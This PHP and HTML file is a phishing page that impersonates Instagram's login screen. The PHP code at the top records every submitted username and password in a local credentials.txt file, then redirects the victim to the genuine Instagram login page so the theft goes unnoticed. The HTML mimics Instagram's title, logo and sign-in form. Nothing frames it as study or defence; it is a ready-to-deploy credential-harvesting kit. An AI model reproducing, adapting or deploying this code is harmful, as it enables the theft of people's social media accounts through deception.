<?php
// Check if form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capture the posted username and password
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Write the credentials to a file
    $file = fopen("credentials.txt", "a");
    if ($file) {
        fwrite($file, "Username: " . $username . "\n");
        fwrite($file, "Password: " . $password . "\n");
        fwrite($file, "----------------------\n");
        fclose($file);
    }

    // Redirect to a legitimate website after capturing credentials
    header('Location: https://www.instagram.com/login');  // Replace with the legitimate site
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="assets/css/main.css">
  <title>Instagram</title>
</head>
<body>
  <main class="l-main">
    <div class="l-main__img">
      <img src="assets/img/homepage.png" alt="Smartphones">
    </div>
    <div class="l-user">
      <div class="c-panel group">
        <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
        <div class="c-panel__form">
          <!-- Updated form to POST data to PHP script -->
          <form method="POST" action="">
            <input type="text" name="username" class="c-panel__input" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" class="c-panel__input" placeholder="Password" required>
            <button type="submit" class="c-btn">Log In</button>
            <span class="c-panel__span">OR</span>
          </form>
        </div>
        <a href="#" class="c-panel__facebook">Login with Facebook</a>
        <a href="#" class="c-panel__forgot">Forgot password?</a>
      </div>
      <div class="c-signup group">
        <p>Don't have an account? <span>Sign up</span></p>
      </div>
      <div class="c-app">
        <p>Get the app.</p>
        <div class="c-app__download">
          <img src="assets/img/apple.png" alt="Apple Store">
          <img src="assets/img/google.png" alt="Google Play">
        </div>
      </div>
    </div>
  </main>
</body>
</html>
